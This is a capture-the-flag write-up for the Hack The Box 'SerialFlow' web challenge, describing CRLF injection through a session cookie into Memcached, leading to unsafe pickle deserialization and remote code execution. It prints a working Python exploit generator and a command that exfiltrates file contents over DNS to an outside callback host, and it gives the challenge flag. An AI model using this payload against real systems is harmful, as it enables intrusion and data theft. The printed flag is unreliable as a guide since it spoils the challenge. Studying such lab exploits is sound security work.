# SerialFlow Challenge

**Platform:** Hack The Box

**Author:** 0xL0m4

**Category:** Web (Medium)

<img width="1513" height="172" alt="image" src="https://github.com/user-attachments/assets/c562972d-db74-4f14-8aa2-16d91d328fe7" />


## Challenge Description

SerialFlow is the main global network used by KORP, you have managed to reach a root server web interface by traversing KORP's external proxy network. Can you break into the root server and open pandoras box by revealing the truth behind KORP?

## Tools Used

- Browser Developer Tools
- VS code
- DNS hook 

## Steps

### 1. Source Code Analysis

After opening the website, I downloaded the application's source code and started reviewing it.

The main file of interest was: app.py


While analyzing the application, I noticed that it uses Memcached as the session backend.


### 2. Understanding Memcached

Memcached is an in-memory key-value store commonly used for caching and, in some applications, storing session data.

The plaintext Memcached protocol uses commands such as:

```
set <key> <flags> <expiry> <data-length>\r\n
<data>\r\n
```

and:

```
get <key>\r\n
```

An important detail is that Memcached commands are terminated using CRLF:

```text
\r\n
```

Therefore, if attacker-controlled data can reach a Memcached command and contain CRLF characters, it may be possible to inject additional Memcached commands.


### 3. Researching the Vulnerability

I searched for Memcached injection techniques and found a very useful research article:

[Memcached Command Injections](https://btlfry.gitlab.io/notes/posts/memcached-command-injections-at-pylibmc/)

The article describes a particularly interesting attack chain involving:

```text
Session cookie --> CRLF Injection --> Memcached Command Injection --> Malicious Pickle Data --> Unsafe Deserialization --> Remote Code Execution
```

### 4. Exploit Development

I used the exploit from the referenced research and modified the command executed by the Pickle payload.

Instead of executing a local command such as ping, I used a DNS request to my controlled DNS callback service.

The relevant payload was:

```python
import pickle
import os

class RCE:
    def __reduce__(self):
        cmd = (f"dig $(cat /flag*).<your-dnshook-id>.dnshook.site")
        return os.system, (cmd,)

def generate_exploit():
    payload = pickle.dumps(RCE(), 0)
    payload_size = len(payload)

    cookie = b'137\r\nset BT_:1337 0 2592000 '
    cookie += str.encode(str(payload_size))
    cookie += str.encode('\r\n')
    cookie += payload
    cookie += str.encode('\r\n')
    cookie += str.encode('get BT_:1337')

    pack = ''

    for x in list(cookie):
        if x > 64:
            pack += oct(x).replace("0o", "\\")
        elif x < 8:
            pack += oct(x).replace("0o", "\\00")
        else:
            pack += oct(x).replace("0o", "\\0")

    return f"\"{pack}\""

result = generate_exploit()
print(result)
```


**Memcached Injection**

The generated payload contains Memcached commands separated using CRLF: \r\n

Conceptually, the injected data causes Memcached to process something similar to:

```text
set BT_:1337 0 2592000 <payload_size>
<malicious_pickle>
get BT_:1337
```

The important point is that the CRLF characters allow the attacker-controlled session value to break out of the expected Memcached key and introduce additional Memcached protocol commands.

The exploit also converts the bytes into the escaped representation expected by the application's cookie parsing behavior.


### 5. Delivering the Payload

After generating the payload, I copied the resulting value and placed it into the application's session cookie using the browser's Developer Tools.

I then refreshed the website.

This caused the application to process the malicious session value, interact with Memcached, retrieve the injected Pickle object, and deserialize it.

The resulting execution triggered the following command:

```bash
dig $(cat /flag*).<your-dnshook-id>.dnshook.site
```
<img width="1920" height="105" alt="image" src="https://github.com/user-attachments/assets/bf6ebc30-34e5-45c2-85f9-8911e29d7d71" />


### 6. DNS Exfiltration

The DNS callback was triggered successfully.

Voilaaa!!

The DNS request contained the flag.

<img width="1886" height="487" alt="image" src="https://github.com/user-attachments/assets/b6977549-97d5-4d88-a467-49153ea9b214" />


## Flag

```text
HTB{y0u_th0ught_th15_wou1d_b3_4_s1mpl3_t4sk?!}
```

#

[The challenge link](https://app.hackthebox.com/challenges/SerialFlow?tab=play_challenge)

See you in the next writeup, In sha Allah!
 
سبحانك اللهم وبحمدك، أشهد أن لا إله إلا أنت، أستغفرك وأتوب إليك.
